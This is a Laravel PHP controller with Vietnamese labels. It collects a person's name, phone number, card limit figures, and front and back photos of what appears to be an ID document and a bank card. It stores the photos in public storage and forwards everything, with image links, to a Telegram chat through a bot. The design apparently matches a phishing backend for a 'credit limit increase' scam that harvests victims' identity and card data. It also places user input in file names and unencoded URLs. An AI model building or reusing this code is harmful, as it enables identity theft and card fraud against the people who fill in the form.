<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Customer;
use Illuminate\Support\Facades\Log;

class CustomerController extends Controller
{
    public function save(Request $request)
    {
        // dd($request->all());
        $request->validate([
            'name' => 'required',
            'phone' => 'required',
            'limit_now' => 'required',
            'limit_total' => 'required',
            'limit_increase' => 'required',
            'mattruoc' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'matsau' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'mattruoc_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'matsau_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ], [
            'name.required' => 'Vui lòng nhập tên khách hàng',
            'phone.required' => 'Vui lòng nhập số điện thoại',
            'limit_now.required' => 'Vui lòng nhập giới hạn hiện tại',
            'limit_total.required' => 'Vui lòng nhập giới hạn tối đa',
            'limit_increase.required' => 'Vui lòng nhập giới hạn tăng',
            'mattruoc.required' => 'Vui lòng nhập mật khẩu trước',
            'matsau.required' => 'Vui lòng nhập mật khẩu sau',
            'mattruoc_card.required' => 'Vui lòng nhập mật khẩu trước thẻ',
            'matsau_card.required' => 'Vui lòng nhập mật khẩu sau thẻ',
            'mattruoc.image' => 'Mật khẩu trước không đúng định dạng',
            'matsau.image' => 'Mật khẩu sau không đúng định dạng',
            'mattruoc_card.image' => 'Mật khẩu trước thẻ không đúng định dạng',
            'matsau_card.image' => 'Mật khẩu sau thẻ không đúng định dạng',
            'mattruoc.mimes' => 'Mật khẩu trước không đúng định dạng',
            'matsau.mimes' => 'Mật khẩu sau không đúng định dạng',
            'mattruoc_card.mimes' => 'Mật khẩu trước thẻ không đúng định dạng',
            'matsau_card.mimes' => 'Mật khẩu sau thẻ không đúng định dạng',
            'mattruoc.max' => 'Mật khẩu trước không quá 2MB',
            'matsau.max' => 'Mật khẩu sau không quá 2MB',
            'mattruoc_card.max' => 'Mật khẩu trước thẻ không quá 2MB',
            'matsau_card.max' => 'Mật khẩu sau thẻ không quá 2MB',
        ]);

        // save image to storage
        $mattruoc = $request->file('mattruoc');
        $mattruoc_name = 'mặt trước-' . $request->name . time() . '.' . $mattruoc->extension();
        $mattruoc->storeAs('public', $mattruoc_name);

        $matsau = $request->file('matsau');
        $matsau_name = 'mặt sau-' . $request->name . time() . '.' . $matsau->extension();
        $matsau->storeAs('public', $matsau_name);

        $mattruoc_card = $request->file('mattruoc_card');
        $mattruoc_card_name = 'mặt trước thẻ-' . $request->name . time() . '.' . $mattruoc_card->extension();
        $mattruoc_card->storeAs('public', $mattruoc_card_name);

        $matsau_card = $request->file('matsau_card');
        $matsau_card_name =  'mặt sau thẻ-' . $request->name . time() . '.' . $matsau_card->extension();
        $matsau_card->storeAs('public', $matsau_card_name);

        // save to database
        $customer = new Customer();
        $customer->name = $request->name;
        $customer->phone = $request->phone;
        $customer->limit_now = $request->limit_now;
        $customer->limit_total = $request->limit_total;
        $customer->limit_increase = $request->limit_increase;
        $customer->mattruoc = $mattruoc_name;
        $customer->matsau = $matsau_name;
        $customer->mattruoc_card = $mattruoc_card_name;
        $customer->matsau_card = $matsau_card_name;
        $customer->save();

        // send to telegram by bot telegram
        // $message = "Có khách hàng mới: \n";
        // $message .= "Tên: " . $request->name . "\n";
        // $message .= "Số điện thoại: " . $request->phone . "\n";
        // $message .= "Giới hạn hiện tại: " . $request->limit_now . "\n";
        // $message .= "Giới hạn tối đa: " . $request->limit_total . "\n";
        // $message .= "Giới hạn tăng: " . $request->limit_increase . "\n";
        // // ảnh mặt trước
        // $message .= "Ảnh mặt trước: " . asset('storage/' . $mattruoc_name) . "\n";
        // // ảnh mặt sau
        // $message .= "Ảnh mặt sau: " . asset('storage/' . $matsau_name) . "\n";
        // // ảnh mặt trước thẻ
        // $message .= "Ảnh mặt trước thẻ: " . asset('storage/' . $mattruoc_card_name) . "\n";
        // // ảnh mặt sau thẻ
        // $message .= "Ảnh mặt sau thẻ: " . asset('storage/' . $matsau_card_name) . "\n";

        // send html
        $message = " <b>Có khách hàng mới:</b> \n";
        $message .= " <b>Tên:</b> " . $request->name . "\n";
        $message .= " <b>Số điện thoại:</b> " . $request->phone . "\n";
        $message .= " <b>Giới hạn hiện tại:</b> " . $request->limit_now . "\n";
        $message .= " <b>Giới hạn tối đa:</b> " . $request->limit_total . "\n";
        $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";
        // ảnh mặt trước
        $message .= " <b>Ảnh mặt trước:</b> " . "<a href='" . asset('storage/' . $mattruoc_name) . "'>" . asset('storage/' . $mattruoc_name) . "</a>" . "\r\n";

        // ảnh mặt sau

        $message .= " <b>Ảnh mặt sau:</b> " . "<a href='" . asset('storage/' . $matsau_name) . "'>" . asset('storage/' . $matsau_name) . "</a>" . "\r\n";

        // ảnh mặt trước thẻ

        $message .= " <b>Ảnh mặt trước thẻ:</b> " . "<a href='" . asset('storage/' . $mattruoc_card_name) . "'>" . asset('storage/' . $mattruoc_card_name) . "</a>" . "\r\n";

        // ảnh mặt sau thẻ

        // $message .= " <b>Ảnh mặt sau thẻ:</b> " . "<a href='". asset('storage/' . $matsau_card_name). "'>". asset('storage/' . $matsau_card_name) . "</a>" . "\r\n";

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_name) . "&caption=Ảnh mặt trước";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_name) . "&caption=Ảnh mặt sau";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_card_name) . "&caption=Ảnh mặt trước thẻ";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_card_name) . "&caption=Ảnh mặt sau thẻ";

        file_get_contents($url);

        return response()->json([
            'message' => 'Thêm khách hàng thành công',
            'status' => 'success'
        ]);
    }
    public function postImage($url, $postContent)
    {

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postContent);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
        $result = curl_exec($curl);
        curl_close($curl);
        return $result;
    }
}
